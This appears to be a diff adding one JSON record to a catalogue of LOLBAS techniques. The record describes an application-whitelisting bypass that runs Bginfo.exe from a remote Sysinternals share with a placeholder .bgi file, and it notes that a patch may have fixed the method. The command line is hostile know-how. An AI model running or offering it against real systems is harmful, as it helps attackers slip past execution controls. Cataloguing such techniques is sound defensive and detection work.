@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-bginfo-exe-awl-bypass-3",
+  "name": "LOLBAS · Bginfo.exe (AWL Bypass) #3",
+  "command": "\\\\live.sysinternals.com\\Tools\\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt",
+  "description": "This style of execution may not longer work due to patch.",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "bginfo",
+    "awl-bypass"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/Bginfo/",
+  "upstream_id": "Bginfo.exe/AWL Bypass/2",
+  "category": "lolbas",
+  "subcategory": "awl-bypass",
+  "references": [
+    {
+      "title": "LOLBAS — Bginfo.exe",
+      "url": "https://lolbas-project.github.io/lolbas/Bginfo/"
+    }
+  ]
+}
